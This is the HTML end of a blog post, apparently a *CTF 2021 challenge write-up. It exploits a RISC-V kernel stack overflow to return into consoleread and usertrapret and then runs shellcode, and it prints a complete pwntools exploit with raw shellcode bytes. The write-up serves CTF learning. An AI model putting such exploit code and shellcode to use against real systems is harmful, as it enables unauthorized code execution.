  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="n">which_dev</span> <span class="o">=</span> <span class="n">devintr</span><span class="p">())</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
    <span class="c1">// ok
</span><span class="c1"></span>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;usertrap(): unexpected scause %p pid=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r_scause</span><span class="p">(),</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;            sepc=%p stval=%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r_sepc</span><span class="p">(),</span> <span class="n">r_stval</span><span class="p">());</span>
    <span class="n">p</span><span class="o">-&gt;</span><span class="n">killed</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">killed</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

  <span class="c1">// give up the CPU if this is a timer interrupt.
</span><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="n">which_dev</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">yield</span><span class="p">();</span>

  <span class="n">usertrapret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>我们先跳到consoleread，再usertrapret回到用户态</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;consoleread&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">6</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;usertrapret&#39;</span><span class="p">])</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;send?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;input</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png"
        data-srcset="https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png, https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png 1.5x, https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png 2x"
        data-sizes="auto"
        alt="https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png"
        title="https://i.loli.net/2021/02/01/VqiYQKltFafP6Xn.png" /></p>
<p>读risc-v的shellcode到用户栈上，返回到用户态再通过栈溢出return to shellcode</p>
<p>由于console.c设置了缓冲区长度，一次最多只能读入0x80个字节，所以得读两次</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="p">{</span>
  <span class="k">struct</span> <span class="n">spinlock</span> <span class="n">lock</span><span class="p">;</span>
  
  <span class="c1">// input
</span><span class="c1"></span><span class="cp">#define INPUT_BUF 128
</span><span class="cp"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">INPUT_BUF</span><span class="p">];</span>
  <span class="n">uint</span> <span class="n">r</span><span class="p">;</span>  <span class="c1">// Read index
</span><span class="c1"></span>  <span class="n">uint</span> <span class="n">w</span><span class="p">;</span>  <span class="c1">// Write index
</span><span class="c1"></span>  <span class="n">uint</span> <span class="n">e</span><span class="p">;</span>  <span class="c1">// Edit index
</span><span class="c1"></span><span class="p">}</span> <span class="n">cons</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>完整exp如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># context.log_level = &#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./run.sh&#34;</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;kernel&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;consoleread&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">6</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;usertrapret&#39;</span><span class="p">])</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;send?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;input</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9d\x64\x9b\x84\x34\x87\x23\x3c\x91\xfe\x23\x30\x91\xfe\x23\x38\x01\xfe\x13\x05\x01\xfe\x23\x34\xa1\xfe\x13\x05\x81\xff\x93\x05\x81\xfe\x9d\x48\x73\x00\x00\x00</span><span class="s2">&#34;</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2f28</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x00\x00\x00\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="mh">0x80</span><span class="p">])</span>
<span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
<span class="c1"># raw_input()</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mh">0x80</span><span class="p">:])</span>

<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-01-23</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2021/01/starctf2021/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2021/01/starctf2021/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2021/01/starctf2021/" data-title="*CTF 2021"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2021/01/riscv-pwn/" class="prev" rel="prev" title="RISC-V PWN 调试环境搭建"><i class="fas fa-angle-left fa-fw"></i>RISC-V PWN 调试环境搭建</a>
            <a href="/2021/01/armpwn/" class="next" rel="next" title="ARM PWN 调试环境搭建">ARM PWN 调试环境搭建<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">🏴‍☠️ Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
